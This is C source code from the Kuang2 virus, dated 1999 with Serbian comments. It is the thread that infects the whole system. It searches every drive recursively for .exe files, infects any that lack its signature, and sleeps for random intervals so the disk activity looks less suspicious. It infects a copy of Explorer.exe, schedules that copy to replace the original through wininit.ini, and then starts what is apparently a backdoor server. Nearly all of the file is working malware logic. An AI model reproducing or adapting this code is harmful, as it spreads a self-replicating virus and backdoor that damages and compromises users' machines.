/***[ThuNderSoft]*************************************************************
							 KUANG2: infect thread
								   ver: 0.14
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

/* HISTORY */
// ver 0.14 (26-may-1999): test mode
// ver 0.13 (21-may-1999): kada ne moÇe explorer.exe onda ceo c:\windows!
// ver 0.12 (14-may-1999): born code
// ver 0.10 (11-may-1999): born code

#include <windows.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

// ako je definisan TESTMODE onda se formira fajl u rutu C diska koji
// sadrÇi informacije o svakom inficiranom fajlu
//#define TESTMODE

// ako je definisan SKIP_C_DISK onda se C disk preskaÅe prilikom inficiranja
//#define SKIP_C_DISK





#ifdef TESTMODE
DWORD written;
HANDLE testfile;
#endif


// maximalna dozvoljena dubina rekurzije
#define		MAX_DEEP		12

extern int IsFileInfect(char *, char*);
extern int InfectFile(char *);

extern HWND hWnd;
extern char Kuang2_class[];
extern DWORD drives;
char *fn;
char _bf[]="..";
char exty[]="w";

unsigned int filescount, deep;
BOOL	INFECT_ALL;

// potpis fajla
extern char kript;
char *signature=&kript+1;



/*
	InfectFolder
	------------
  ˛ Inficira ceo folder sa svi subfolderima.
  ˛ rekurzija, ali do odreîene granice.
  ˛ brzina zaraze: proseÅno oko 21 sekundu za 10 fajlova. */

void InfectFolder(char *folder) {
	WIN32_FIND_DATA FileData;
	HANDLE hSearch;
	char path[MAX_PATH];
	unsigned int ix;

	// dubina rekurzije
	deep++;
	if (deep>MAX_DEEP) {deep--; return;}

	// zapoÅni pretragu foldera
	strcopyF(path, folder);
	setfilename(path, "*.*");
	hSearch=FindFirstFile(path, &FileData);
	if (hSearch==INVALID_HANDLE_VALUE) return;

	// vrti sve fajlove u folderu
	do {
		setfilename(path, FileData.cFileName);		// uzmi ime trenutnog fajla

		if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (INFECT_ALL==FALSE) continue;	// ako ne inficiraÑ sve podfoldere idi dalje
			fn=getfilename(path);
			if (!lstrcmp(fn, &_bf[1]) || !lstrcmp(fn, _bf)) continue;	// ako je '.' ili '..'
			ix=strlengthF(path);
			path[ix]='\\'; path[ix+1]=0;        // dodaj '/'
#ifdef TESTMODE
			WriteFile(testfile, path, strlengthF(path), &written, NULL);
			WriteFile(testfile, "\r\n", 2, &written, NULL);
#endif
			InfectFolder(path);					// rekurzija!
#ifdef TESTMODE
			WriteFile(testfile, "<OK>\r\n", 6, &written, NULL);
#endif
			path[ix]=0;							// obriÑi '/'
		} else {
			fn=getfileext(path);					// uzmi extenziju
			if (fn==NULL) continue;					// ako ext ne postoji izaîi
			if (!lstrcmpi(fn, "exe")) {             // da li je .exe?
				filescount++;
				if (!IsFileInfect(path, signature)) {	// ako fajl nije inficiran....
					/* INFICIRAJ! */
#ifdef TESTMODE
					WriteFile(testfile, path, strlengthF(path), &written, NULL);
#endif
					InfectFile(path);
#ifdef TESTMODE
					WriteFile(testfile, " [OK]\r\n", 7, &written, NULL);
#endif
				}
				// ako je pregledano 10 fajlova, odspavaj malo
				// da ne bi bila sumljiva 'trka' po disku
				if (filescount==10) {
					filescount=0;
#ifndef TESTMODE
					if (INFECT_ALL==TRUE) {				// ako inficiraÑ sve foldere
						ix=GetTickCount() & 0x0F;		// sluÅajan broj od 0-15
						Sleep((ix+13)*1000);			// spavaj od 13sec-28sec
					}
#endif
				}
			}
		}
	} while (FindNextFile(hSearch, &FileData));

	// zavrÑi sa pretragom
	FindClose(hSearch);
	deep--;
	return;
}


extern int StartServer(void);


/*
	InfectThread
	------------
  ˛ Thread koji zaraÇava ceo sistem. */

DWORD WINAPI InfectThread (LPVOID _d)
{
#ifndef TESTMODE
	char explorer[MAX_PATH];
	char ttemp[MAX_PATH];
	char wininit[MAX_PATH];
#endif
	DWORD drvs=drives;
	char root[]="a:\\";

	*signature=0x4C;		// ispravi signature
	INFECT_ALL=TRUE;		// inficiraj sve foldere!
	Sleep(3000);			// prvo spavaj 3 sekunde

#ifndef TESTMODE

	/* FAZA #1 - inficiranje Explorer.exe */

	GetWindowsDirectory(explorer, MAX_PATH);
	strcopyF(wininit, explorer);
	straddF(explorer, "\\Explorer.exe");        // napravi string sa Explorer.exe
	straddF(wininit, "\\wininit.ini");          // napravi string sa Winit.exe
	switch (IsFileInfect(explorer, signature))	// da li je explorer.exe zaraÇen?
	{
		case 0:			// NIJE INFICIRAN
			strcopyF(ttemp, explorer);
			exty[0]=Kuang2_class[4];				// jedinstvena extenzija
			setfileext(ttemp, exty);				// napravi string za kopiju Exlorer.exe
			CopyFile(explorer, ttemp, FALSE);		// kopiraj Explorer.exe, uvek!
			if (!InfectFile(ttemp)) {				// ako je uspeÑno inficiran...
				WritePrivateProfileString("Rename", explorer, ttemp, wininit);   // napravi 'wininit.ini' :)
			} else {								// a ako nije uspeÑno inficiran
				DeleteFile(ttemp);					// obriÑi kopirani fajl
				deep=strlengthF(explorer)-12;
				explorer[deep]=0;					// naîi Windows folder
				INFECT_ALL=FALSE;					// i samo njega
				InfectFolder(explorer);				// inficiraj
			}
			break;		// nastavi dalje!
		case -1:		// GREéKA KOD ODREôIVANJA DA LI JE INFICIRAN (?)
			SendMessage(hWnd, WM_DESTROY, 0, 0);	// zavrÑava posao
			return 0;	// izaîi
	}

#else
	MsgBox("Kuang2 theVirus *TEST* mode.");
	testfile=CreateFile("c:\\k2test.dat", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
#endif


	/* FAZA #2 - inficiranje celog sistema */

	// prvo startuj server, poÑto se virus ne startuje prvi put
	// (tj. explorer.exe je zaraÇen)
	StartServer();

	// spavaj 10 sekundi
	Sleep(10000);

	// inficiraj ceo sistem
	filescount=0;			// brojaÅ fajlova
	while (drvs) {
		deep=0;
#ifdef SKIP_C_DISK
		if (root[0]=='c') {
			root[0]++;
			drvs=drvs>>1;
			continue;
		}
#endif
		if (drvs & 1) InfectFolder(root);
		drvs=drvs>>1;
		root[0]++;
	}

#ifdef TESTMODE
	MsgBox("THE END");
	CloseHandle(testfile);
	SendMessage(hWnd, WM_DESTROY, 0, 0);
#endif

	return 0;
}
